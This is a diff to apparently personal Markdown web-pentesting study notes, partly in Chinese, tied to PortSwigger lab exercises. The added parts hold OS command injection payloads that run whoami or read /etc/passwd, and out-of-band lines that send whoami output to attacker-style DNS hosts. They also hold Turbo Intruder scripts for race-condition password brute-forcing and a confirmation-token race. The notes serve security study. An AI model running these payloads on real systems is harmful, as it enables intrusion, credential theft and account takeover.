@@ -152,7 +152,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 ---
 
-## brutepforce
+## John 
 
 [bruteforce tools](../security/bruteforcingtools.md)
 
@@ -161,8 +161,6 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 ```bash
 sort -u wordlist.dic > sortedwordlist.dic
 ```
-
-## John 
 
 [John the Ripper](../crypto/john.md)
 
@@ -293,6 +291,21 @@ def ping_host(user_input
 | `&` | 后台执行 | Windows |
 | `\r\n` | 换行注入 | Windows |
 
+**PoC**
+
+```bash
+productId=2|whoami #&storeId=5
+productId=2&storeId=5|whoami
+
+# & -> %26 # -> %23
+productId=2&storeId=5%26whoami
+productId=2%26whoami+%23&storeId=5
+```
+
+```bash
+name=233&email=233%40gmail.com|sleep 10 #&subject=1
+```
+
 ### blind OS command
 
 **PoC**
@@ -301,11 +314,14 @@ def ping_host(user_input
 ```bash
 & whoami > /var/www/static/whoami.txt &
 ||whoami+>+/var/www/images/whoami2.txt||
+
+email=233%40gmail.com|cat /etc/passwd >> /var/www/images/output.txt #&subject=1
 ```
 *out-of-band (OAST) techniques*
 ```bash
 & nslookup kgji2ohoyw.web-attacker.com &
 ||nslookup+`whoami`.xxx.oastify.com||
+|nslookup `whoami`.xxx.oastify.com #
 ```
 ---
 
@@ -420,3 +436,76 @@ X-Original-URL: /admin/deleteUser
 
 `Referer` 用来表示“当前请求是从哪个页面跳转或发起过来的”。浏览器通常会对来自某个页面的请求自动添加这个头部。
 
+## Race conditions
+
+[Race conditions](https://portswigger.net/web-security/race-conditions) are a common type of vulnerability closely related to business logic flaws. They occur when websites process requests **concurrently** without adequate safeguards. This can lead to multiple distinct threads interacting with the same data at the same time, resulting in a "**collision**" that causes unintended behavior in the application. A race condition attack uses carefully timed requests to cause intentional collisions and exploit this unintended behavior for malicious purposes.
+
+The period of time during which a **collision** is possible is known as the "**race window**". This could be the fraction of a second between two interactions with the database, for example.
+
+**PoC**
+
+*examples/race-single-packet-attack.py* 改
+
+*Bypassing rate limits via race conditions*
+```python
+def queueRequests(target, wordlists):
+
+    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2
+                           )
+    
+    # assign the list of candidate passwords from your clipboard
+    passwords = wordlists.clipboard
+    
+    # queue a login request using each password from the wordlist
+    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
+    for password in passwords:
+        engine.queue(target.req, password, gate='1')
+    
+    # once every request has been queued
+    # invoke engine.openGate() to send all requests in the given gate simultaneously
+    engine.openGate('1')
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+*Partial construction race conditions*
+```python
+def queueRequests(target, wordlists):
+
+    engine = RequestEngine(endpoint=target.endpoint,
+                            concurrentConnections=1,
+                            engine=Engine.BURP2
+                            )
+    
+    confirmationReq = '''POST /confirm?token[]= HTTP/2
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: phpsessionid=YOUR-SESSION-TOKEN
+Content-Length: 0
+
+'''
+    for attempt in range(20):
+        currentAttempt = str(attempt)
+        username = 'User' + currentAttempt
+    
+        # queue a single registration request
+        engine.queue(target.req, username, gate=currentAttempt)
+        
+        # queue 50 confirmation requests - note that this will probably sent in two separate packets
+        for i in range(50):
+            engine.queue(confirmationReq, gate=currentAttempt)
+        
+        # send all the queued requests for this attempt
+        engine.openGate(currentAttempt)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+## SSRF
+
+[SSRF](../webapp/ServerSideAttacks#ssrf) (**Server-Side Request Forgery**)是一种 Web 安全漏洞，攻击者可以诱导服务端应用向攻击者指定的目标发起请求。本质上是"借服务器的手"去访问它本不该访问、或攻击者自己无法直接访问的资源。
